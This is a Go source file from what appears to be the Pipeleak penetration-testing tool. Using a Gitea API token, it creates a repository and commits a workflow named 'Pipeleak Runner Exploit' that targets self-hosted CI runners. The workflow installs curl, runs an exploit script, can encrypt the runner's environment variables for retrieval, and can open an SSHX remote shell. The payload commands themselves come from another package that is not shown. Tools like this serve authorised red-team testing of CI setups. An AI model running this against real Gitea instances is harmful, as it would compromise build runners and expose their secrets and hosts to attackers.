package exploit

import (
	"code.gitea.io/sdk/gitea"
	"github.com/CompassSecurity/pipeleak/pkg/runners/template"
	"github.com/rs/zerolog/log"
	"gopkg.in/yaml.v3"
)

type GiteaWorkflow struct {
	Name string                    `yaml:"name"`
	On   map[string]interface{}    `yaml:"on"`
	Jobs map[string]GiteaJob       `yaml:"jobs"`
}

type GiteaJob struct {
	RunsOn []string    `yaml:"runs-on"`
	Steps  []GiteaStep `yaml:"steps"`
}

type GiteaStep struct {
	Name string `yaml:"name,omitempty"`
	Run  string `yaml:"run,omitempty"`
	Uses string `yaml:"uses,omitempty"`
}

func ExploitRunners(runnerLabels []string, dry bool, shell bool, giteaApiToken string, giteaUrl string, ageEncryptionPublicKey string, repoName string) {

	workflowYml := GenerateWorkflowYml(runnerLabels, shell, ageEncryptionPublicKey)

	if len(ageEncryptionPublicKey) > 0 {
		log.Info().Msg("Decrypt age (https://github.com/FiloSottile/age/releases) output locally using: age --decrypt -i key.txt age_output.txt")
	}

	if dry {
		log.Info().Msg("Generated Gitea Actions workflow YAML:")
		log.Info().Msg(workflowYml)
		log.Info().Msg("Create your repository and .gitea/workflows/exploit.yml manually")
		return
	}

	client, err := gitea.NewClient(giteaUrl, gitea.SetToken(giteaApiToken))
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating gitea client")
	}

	opts := &gitea.CreateRepoOption{
		Name:     repoName,
		AutoInit: true,
	}

	repo, _, err := client.CreateRepo(*opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating repository")
	}

	log.Info().Str("name", repo.Name).Str("url", repo.HTMLURL).Msg("Created repository")

	fileOpts := &gitea.CreateFileOptions{
		FileOptions: gitea.FileOptions{
			BranchName: "main",
			Message:    "Pipeleak create workflow",
		},
		Content: workflowYml,
	}

	fileInfo, _, err := client.CreateFile(repo.Owner.UserName, repo.Name, ".gitea/workflows/exploit.yml", *fileOpts)

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Creating workflow file failed")
	}

	log.Info().Str("file", fileInfo.Content.Path).Msg("Created workflow file")
	log.Info().Str("url", repo.HTMLURL+"/actions").Msg("Check workflow runs manually")
	log.Info().Msg("Make sure to delete the repository when done")
}

func GenerateWorkflowYml(runnerLabels []string, shell bool, ageEncryptionPublicKey string) string {
	workflow := GiteaWorkflow{
		Name: "Pipeleak Runner Exploit",
		On: map[string]interface{}{
			"push": map[string]interface{}{
				"branches": []string{"main"},
			},
		},
		Jobs: make(map[string]GiteaJob),
	}

	if len(runnerLabels) == 0 {
		runnerLabels = []string{"ubuntu-latest"}
	}

	for _, label := range runnerLabels {
		jobName := "pipeleak-job-" + label
		job := CreateExploitJob([]string{label}, shell, ageEncryptionPublicKey)
		workflow.Jobs[jobName] = job
	}

	yamlData, err := yaml.Marshal(&workflow)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed marshalling yaml")
	}

	return string(yamlData)
}

func CreateExploitJob(labels []string, shell bool, ageEncryptionPublicKey string) GiteaJob {
	job := GiteaJob{
		RunsOn: labels,
		Steps:  []GiteaStep{},
	}

	job.Steps = append(job.Steps, GiteaStep{
		Name: "Setup environment",
		Run:  "apt update && apt install curl libcap2-bin -y || yum install -y curl || apk add curl",
	})

	exploitCommands := template.ExploitScript()
	job.Steps = append(job.Steps, GiteaStep{
		Name: "Run exploit",
		Run:  JoinCommands(exploitCommands),
	})

	if len(ageEncryptionPublicKey) > 0 {
		ageCommands := template.GetAgeEncryptionCommands(ageEncryptionPublicKey)
		job.Steps = append(job.Steps, GiteaStep{
			Name: "Encrypt environment variables",
			Run:  JoinCommands(ageCommands),
		})
	}

	if shell {
		job.Steps = append(job.Steps, GiteaStep{
			Name: "Start SSHX shell",
			Run:  template.GetShellCommand(),
		})
	}

	return job
}

func JoinCommands(commands []string) string {
	result := ""
	for i, cmd := range commands {
		result += cmd
		if i < len(commands)-1 {
			result += "\n"
		}
	}
	return result
}
